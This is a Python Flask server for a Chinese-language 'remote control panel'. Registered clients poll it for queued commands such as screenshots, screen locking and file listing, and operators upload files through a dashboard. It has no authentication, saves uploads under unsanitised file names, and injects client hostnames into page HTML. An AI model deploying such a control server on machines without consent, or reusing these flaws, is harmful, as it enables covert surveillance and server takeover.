from flask import Flask, request, jsonify, send_file, render_template_string
import os
import json
import threading
import time
import logging
from datetime import datetime
from collections import defaultdict
import heapq
from dataclasses import dataclass
from typing import Dict, List, Set
import asyncio
import concurrent.futures

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# 客户端管理优化
@dataclass
class ClientInfo:
    client_id: str
    ip: str
    hostname: str
    last_seen: datetime
    status: str = 'online'
    connection_time: datetime = None
    resource_usage: float = 0.0  # 资源使用评分
    commands_processed: int = 0
    
    def __post_init__(self):
        if self.connection_time is None:
            self.connection_time = datetime.now()

class ClientManager:
    def __init__(self, max_clients=50, resource_threshold=0.8):
        self.clients: Dict[str, ClientInfo] = {}
        self.commands_queue: Dict[str, List] = defaultdict(list)
        self.max_clients = max_clients
        self.resource_threshold = resource_threshold
        self._lock = threading.RLock()
        
        # 资源监控
        self.system_resources = {
            'cpu_usage': 0.0,
            'memory_usage': 0.0,
            'active_connections': 0
        }
        
        # 启动资源监控
        self._start_resource_monitor()
    
    def _start_resource_monitor(self):
        """启动资源监控"""
        def monitor():
            while True:
                try:
                    import psutil
                    self.system_resources['cpu_usage'] = psutil.cpu_percent(interval=1)
                    self.system_resources['memory_usage'] = psutil.virtual_memory().percent
                    self.system_resources['active_connections'] = len([
                        c for c in self.clients.values() 
                        if c.status == 'online'
                    ])
                except Exception as e:
                    logger.error(f"资源监控错误: {e}")
                time.sleep(5)
        
        threading.Thread(target=monitor, daemon=True).start()
    
    def can_accept_client(self) -> bool:
        """检查是否可以接受新客户端"""
        with self._lock:
            active_clients = len([c for c in self.clients.values() if c.status == 'online'])
            
            # 检查客户端数量限制
            if active_clients >= self.max_clients:
                return False
            
            # 检查系统资源
            if (self.system_resources['cpu_usage'] > 80 or 
                self.system_resources['memory_usage'] > 85):
                return False
            
            return True
    
    def register_client(self, client_id: str, ip: str, hostname: str) -> bool:
        """注册客户端"""
        with self._lock:
            if not self.can_accept_client():
                logger.warning(f"资源不足，拒绝客户端连接: {client_id}")
                return False
            
            self.clients[client_id] = ClientInfo(
                client_id=client_id,
                ip=ip,
                hostname=hostname,
                last_seen=datetime.now(),
                connection_time=datetime.now()
            )
            
            logger.info(f"客户端注册成功: {client_id} - {hostname}")
            return True
    
    def update_heartbeat(self, client_id: str) -> bool:
        """更新客户端心跳"""
        with self._lock:
            if client_id in self.clients:
                self.clients[client_id].last_seen = datetime.now()
                self.clients[client_id].status = 'online'
                return True
            return False
    
    def add_command(self, client_id: str, command: dict):
        """添加命令到队列"""
        with self._lock:
            if client_id in self.clients:
                # 限制队列长度
                if len(self.commands_queue[client_id]) < 10:
                    self.commands_queue[client_id].append(command)
                else:
                    logger.warning(f"客户端 {client_id} 命令队列已满")
    
    def get_command(self, client_id: str) -> dict:
        """获取下一个命令"""
        with self._lock:
            if (client_id in self.commands_queue and 
                self.commands_queue[client_id]):
                return self.commands_queue[client_id].pop(0)
            return None
    
    def cleanup_inactive_clients(self, timeout_seconds=300):
        """清理不活跃客户端"""
        with self._lock:
            current_time = datetime.now()
            inactive_clients = []
            
            for client_id, client in self.clients.items():
                time_diff = (current_time - client.last_seen).total_seconds()
                if time_diff > timeout_seconds:
                    inactive_clients.append(client_id)
                    client.status = 'offline'
            
            for client_id in inactive_clients:
                logger.info(f"客户端因超时被标记为离线: {client_id}")
    
    def get_system_status(self) -> dict:
        """获取系统状态"""
        with self._lock:
            active_clients = len([c for c in self.clients.values() if c.status == 'online'])
            total_commands = sum(len(queue) for queue in self.commands_queue.values())
            
            return {
                'active_clients': active_clients,
                'total_clients': len(self.clients),
                'total_commands_queued': total_commands,
                'system_resources': self.system_resources,
                'max_clients': self.max_clients
            }

# 初始化客户端管理器
client_manager = ClientManager(max_clients=50)

# 连接限流器
class ConnectionRateLimiter:
    def __init__(self, max_connections_per_minute=60):
        self.connection_times = []
        self.max_connections = max_connections_per_minute
        self._lock = threading.Lock()
    
    def allow_connection(self) -> bool:
        """检查是否允许新连接"""
        with self._lock:
            current_time = time.time()
            # 清理1分钟前的记录
            self.connection_times = [
                t for t in self.connection_times 
                if current_time - t < 60
            ]
            
            if len(self.connection_times) < self.max_connections:
                self.connection_times.append(current_time)
                return True
            return False

rate_limiter = ConnectionRateLimiter(max_connections_per_minute=100)

# 线程池用于处理耗时操作
thread_pool = concurrent.futures.ThreadPoolExecutor(
    max_workers=10,
    thread_name_prefix="remote_worker"
)

# 控制面板HTML
CONTROL_HTML = '''
<!DOCTYPE html>
<html>
<head>
    <title>远程控制面板 - 优化版</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: #333;
            line-height: 1.6;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: rgba(255, 255, 255, 0.95);
            border-radius: 15px;
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.1);
            overflow: hidden;
        }
        .header {
            background: linear-gradient(135deg, #2c3e50, #3498db);
            color: white;
            padding: 30px;
            text-align: center;
        }
        .status-bar {
            background: #34495e;
            color: white;
            padding: 15px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .client-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 20px;
            padding: 20px;
        }
        .client-card {
            background: white;
            border: 1px solid #e1e8ed;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.08);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        .client-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
        }
        .client-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 15px;
            border-bottom: 2px solid #f8f9fa;
        }
        .client-id {
            font-weight: bold;
            color: #2c3e50;
            font-size: 1.1em;
        }
        .status-online { color: #27ae60; }
        .status-offline { color: #e74c3c; }
        .btn {
            background: #3498db;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 25px;
            cursor: pointer;
            transition: all 0.3s ease;
            margin: 5px;
            font-size: 0.9em;
        }
        .btn:hover {
            background: #2980b9;
            transform: scale(1.05);
        }
        .btn-danger { background: #e74c3c; }
        .btn-danger:hover { background: #c0392b; }
        .btn-success { background: #27ae60; }
        .btn-success:hover { background: #219a52; }
        .screenshot-container {
            margin: 15px 0;
            text-align: center;
        }
        .screenshot {
            max-width: 100%;
            border-radius: 8px;
            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
        }
        .files-list {
            max-height: 200px;
            overflow-y: auto;
            background: #f8f9fa;
            border-radius: 5px;
            padding: 10px;
            margin: 10px 0;
        }
        .file-item {
            padding: 8px;
            border-bottom: 1px solid #e9ecef;
            display: flex;
            justify-content: space-between;
        }
        .file-item:last-child { border-bottom: none; }
        .upload-section {
            background: #f8f9fa;
            padding: 15px;
            border-radius: 8px;
            margin: 10px 0;
        }
        .progress-bar {
            width: 100%;
            height: 20px;
            background: #ecf0f1;
            border-radius: 10px;
            overflow: hidden;
            margin: 10px 0;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #3498db, #2ecc71);
            transition: width 0.3s ease;
        }
        .system-alert {
            background: #fff3cd;
            border: 1px solid #ffeaa7;
            color: #856404;
            padding: 15px;
            border-radius: 5px;
            margin: 10px 0;
        }
        @media (max-width: 768px) {
            .client-grid {
                grid-template-columns: 1fr;
            }
            .status-bar {
                flex-direction: column;
                gap: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 远程控制面板</h1>
            <p>实时监控和管理远程客户端</p>
        </div>
        
        <div class="status-bar">
            <div>
                <strong>系统状态:</strong>
                <span id="system-status">加载中...</span>
            </div>
            <div>
                <strong>客户端:</strong>
                <span id="client-count">0</span> 在线 / 
                <span id="total-clients">0</span> 总计
            </div>
            <div>
                <strong>资源使用:</strong>
                CPU: <span id="cpu-usage">0%</span> | 
                内存: <span id="memory-usage">0%</span>
            </div>
        </div>

        <div id="system-alert" class="system-alert" style="display: none;">
            <!-- 系统警告信息 -->
        </div>

        <div class="client-grid" id="clients-container">
            <div style="text-align: center; padding: 40px; color: #7f8c8d;">
                <h3>等待客户端连接...</h3>
                <p>客户端连接后将显示在这里</p>
            </div>
        </div>
    </div>

    <script>
        // 系统状态更新
        async function updateSystemStatus() {
            try {
                const response = await fetch('/api/system_status');
                const data = await response.json();
                
                document.getElementById('client-count').textContent = data.active_clients;
                document.getElementById('total-clients').textContent = data.total_clients;
                document.getElementById('cpu-usage').textContent = data.system_resources.cpu_usage.toFixed(1) + '%';
                document.getElementById('memory-usage').textContent = data.system_resources.memory_usage.toFixed(1) + '%';
                
                // 更新系统状态文本
                const statusElement = document.getElementById('system-status');
                if (data.active_clients === 0) {
                    statusElement.textContent = '空闲';
                    statusElement.style.color = '#27ae60';
                } else if (data.system_resources.cpu_usage > 80 || data.system_resources.memory_usage > 85) {
                    statusElement.textContent = '高负载';
                    statusElement.style.color = '#e74c3c';
                    showAlert('系统资源使用率较高，建议减少操作频率', 'warning');
                } else {
                    statusElement.textContent = '运行正常';
                    statusElement.style.color = '#3498db';
                }
                
            } catch (error) {
                console.error('更新系统状态失败:', error);
            }
        }

        // 显示警告
        function showAlert(message, type = 'info') {
            const alertDiv = document.getElementById('system-alert');
            alertDiv.textContent = message;
            alertDiv.style.display = 'block';
            
            if (type === 'warning') {
                alertDiv.style.background = '#f8d7da';
                alertDiv.style.borderColor = '#f5c6cb';
                alertDiv.style.color = '#721c24';
            }
            
            setTimeout(() => {
                alertDiv.style.display = 'none';
            }, 5000);
        }

        // 客户端操作函数
        function sendCommand(clientId, command, data = {}) {
            fetch(`/api/command/${clientId}`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({command, data})
            })
            .then(response => response.json())
            .then(result => {
                if (result.status === 'success') {
                    showAlert(`命令 ${command} 已发送到客户端 ${clientId}`, 'info');
                    
                    if (command === 'screenshot' && result.screenshot) {
                        const screenshotDiv = document.getElementById(`screenshot-${clientId}`);
                        if (screenshotDiv) {
                            screenshotDiv.innerHTML = `
                                <div class="screenshot-container">
                                    <img class="screenshot" src="data:image/jpeg;base64,${result.screenshot}" 
                                         alt="远程截屏" onclick="this.style.maxWidth=this.style.maxWidth?'none':'100%'">
                                    <p>点击图片查看原图</p>
                                </div>
                            `;
                        }
                    }
                } else {
                    showAlert(`命令发送失败: ${result.message}`, 'warning');
                }
            })
            .catch(error => {
                console.error('发送命令失败:', error);
                showAlert('网络错误，请检查连接', 'warning');
            });
        }

        function uploadFile(clientId) {
            const fileInput = document.getElementById(`file-${clientId}`);
            const pathInput = document.getElementById(`upload-path-${clientId}`);
            const progressDiv = document.getElementById(`progress-${clientId}`);
            const file = fileInput.files[0];
            const path = pathInput.value;

            if (!file) {
                showAlert('请选择要上传的文件', 'warning');
                return;
            }

            const formData = new FormData();
            formData.append('file', file);
            formData.append('path', path);

            // 显示进度条
            if (progressDiv) {
                progressDiv.innerHTML = `
                    <div class="progress-bar">
                        <div class="progress-fill" style="width: 0%"></div>
                    </div>
                    <p>上传中: 0%</p>
                `;
            }

            fetch(`/api/upload/${clientId}`, {
                method: 'POST',
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    showAlert(`文件上传成功: ${data.path}`, 'info');
                } else {
                    showAlert(`上传失败: ${data.error}`, 'warning');
                }
            })
            .catch(error => {
                console.error('上传失败:', error);
                showAlert('上传失败，请检查网络连接', 'warning');
            })
            .finally(() => {
                if (progressDiv) {
                    progressDiv.innerHTML = '';
                }
                fileInput.value = '';
            });
        }

        // 页面加载完成后初始化
        document.addEventListener('DOMContentLoaded', function() {
            // 每5秒更新系统状态
            updateSystemStatus();
            setInterval(updateSystemStatus, 5000);
            
            // 每10秒更新客户端列表
            setInterval(updateClientsList, 10000);
            updateClientsList();
        });

        // 更新客户端列表（简化版）
        async function updateClientsList() {
            try {
                const response = await fetch('/api/clients');
                const clients = await response.json();
                
                const container = document.getElementById('clients-container');
                if (Object.keys(clients).length === 0) {
                    container.innerHTML = `
                        <div style="text-align: center; padding: 40px; color: #7f8c8d; grid-column: 1 / -1;">
                            <h3>等待客户端连接...</h3>
                            <p>客户端连接后将显示在这里</p>
                        </div>
                    `;
                    return;
                }
                
                let html = '';
                for (const [clientId, client] of Object.entries(clients)) {
                    html += `
                        <div class="client-card">
                            <div class="client-header">
                                <span class="client-id">${client.hostname} (${clientId})</span>
                                <span class="status-${client.status}">● ${client.status.toUpperCase()}</span>
                            </div>
                            
                            <p><strong>IP:</strong> ${client.ip}</p>
                            <p><strong>最后活跃:</strong> ${client.last_seen}</p>
                            <p><strong>运行时间:</strong> ${client.connection_time}</p>
                            
                            <div style="margin: 15px 0;">
                                <button class="btn btn-success" onclick="sendCommand('${clientId}', 'screenshot')">
                                    📸 截屏
                                </button>
                                <button class="btn" onclick="sendCommand('${clientId}', 'lock_screen')">
                                    🔒 锁屏
                                </button>
                                <button class="btn" onclick="sendCommand('${clientId}', 'list_files', {path: 'C:\\\\'})">
                                    📁 文件列表
                                </button>
                            </div>
                            
                            <div id="screenshot-${clientId}"></div>
                            <div id="files-${clientId}"></div>
                            
                            <div class="upload-section">
                                <h4>📤 文件上传</h4>
                                <input type="file" id="file-${clientId}" style="margin: 10px 0;">
                                <input type="text" id="upload-path-${clientId}" placeholder="目标路径" value="C:\\" 
                                       style="width: 100%; padding: 8px; margin: 5px 0; border: 1px solid #ddd; border-radius: 4px;">
                                <button class="btn" onclick="uploadFile('${clientId}')">开始上传</button>
                                <div id="progress-${clientId}"></div>
                            </div>
                        </div>
                    `;
                }
                container.innerHTML = html;
                
            } catch (error) {
                console.error('更新客户端列表失败:', error);
            }
        }
    </script>
</body>
</html>
'''

# API路由
@app.route('/')
def index():
    """控制面板主页"""
    return render_template_string(CONTROL_HTML)

@app.route('/api/system_status')
def api_system_status():
    """获取系统状态"""
    return jsonify(client_manager.get_system_status())

@app.route('/api/clients')
def api_clients():
    """获取客户端列表"""
    clients_data = {}
    for client_id, client in client_manager.clients.items():
        clients_data[client_id] = {
            'hostname': client.hostname,
            'ip': client.ip,
            'last_seen': client.last_seen.strftime('%Y-%m-%d %H:%M:%S'),
            'status': client.status,
            'connection_time': client.connection_time.strftime('%Y-%m-%d %H:%M:%S')
        }
    return jsonify(clients_data)

@app.route('/api/register', methods=['POST'])
def api_register():
    """客户端注册API"""
    try:
        if not rate_limiter.allow_connection():
            return jsonify({
                'status': 'error', 
                'message': '连接频率过高，请稍后重试'
            }), 429
        
        data = request.json
        client_id = data.get('client_id')
        hostname = data.get('hostname', 'Unknown')
        
        if not client_id:
            return jsonify({
                'status': 'error',
                'message': '缺少客户端ID'
            }), 400
        
        if client_manager.register_client(client_id, request.remote_addr, hostname):
            return jsonify({
                'status': 'success', 
                'message': '注册成功'
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '服务器资源不足，无法接受新连接'
            }), 503
            
    except Exception as e:
        logger.error(f"注册错误: {e}")
        return jsonify({
            'status': 'error',
            'message': f'服务器错误: {str(e)}'
        }), 500

@app.route('/api/heartbeat/<client_id>', methods=['POST'])
def api_heartbeat(client_id):
    """客户端心跳API"""
    try:
        if client_manager.update_heartbeat(client_id):
            # 获取待执行命令
            command = client_manager.get_command(client_id)
            return jsonify({
                'status': 'success', 
                'command': command
            })
        else:
            return jsonify({
                'status': 'error',
                'message': '客户端未注册'
            }), 404
            
    except Exception as e:
        logger.error(f"心跳错误: {e}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/api/command/<client_id>', methods=['POST'])
def api_send_command(client_id):
    """发送命令API"""
    try:
        data = request.json
        command = data.get('command')
        command_data = data.get('data', {})
        
        if not command:
            return jsonify({
                'status': 'error',
                'message': '缺少命令参数'
            }), 400
        
        # 检查客户端是否存在
        if client_id not in client_manager.clients:
            return jsonify({
                'status': 'error',
                'message': '客户端不存在'
            }), 404
        
        client_manager.add_command(client_id, {
            'command': command,
            'data': command_data,
            'timestamp': datetime.now().isoformat()
        })
        
        return jsonify({
            'status': 'success',
            'message': '命令已发送到队列'
        })
        
    except Exception as e:
        logger.error(f"发送命令错误: {e}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/api/result/<client_id>', methods=['POST'])
def api_command_result(client_id):
    """接收命令执行结果"""
    try:
        data = request.json
        command = data.get('command')
        result = data.get('result', {})
        
        logger.info(f"命令执行结果 - {client_id}: {command}")
        
        # 这里可以存储结果或进行其他处理
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logger.error(f"接收结果错误: {e}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

@app.route('/api/upload/<client_id>', methods=['POST'])
def api_upload_file(client_id):
    """文件上传API"""
    try:
        if 'file' not in request.files:
            return jsonify({
                'status': 'error',
                'message': '没有文件'
            }), 400
        
        file = request.files['file']
        target_path = request.form.get('path', 'C:\\')
        
        if file.filename == '':
            return jsonify({
                'status': 'error',
                'message': '没有选择文件'
            }), 400
        
        # 在实际应用中，这里应该将文件转发给客户端
        # 简化实现：直接保存到服务端
        upload_dir = 'uploads'
        os.makedirs(upload_dir, exist_ok=True)
        file_path = os.path.join(upload_dir, file.filename)
        file.save(file_path)
        
        logger.info(f"文件上传成功: {file_path}")
        
        return jsonify({
            'status': 'success',
            'path': file_path,
            'message': '文件上传成功'
        })
        
    except Exception as e:
        logger.error(f"文件上传错误: {e}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500

def background_tasks():
    """后台任务"""
    while True:
        try:
            # 清理不活跃客户端
            client_manager.cleanup_inactive_clients()
            
            # 记录系统状态
            status = client_manager.get_system_status()
            if status['active_clients'] > 0:
                logger.info(f"系统状态: {status['active_clients']}个活跃客户端, "
                           f"CPU: {status['system_resources']['cpu_usage']}%, "
                           f"内存: {status['system_resources']['memory_usage']}%")
            
        except Exception as e:
            logger.error(f"后台任务错误: {e}")
        
        time.sleep(60)  # 每分钟执行一次

if __name__ == '__main__':
    # 启动后台任务
    bg_thread = threading.Thread(target=background_tasks, daemon=True)
    bg_thread.start()
    
    logger.info("远程控制服务端启动...")
    logger.info("访问 http://localhost:5000 查看控制面板")
    
    # 生产环境建议使用生产服务器，如Waitress或Gunicorn
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)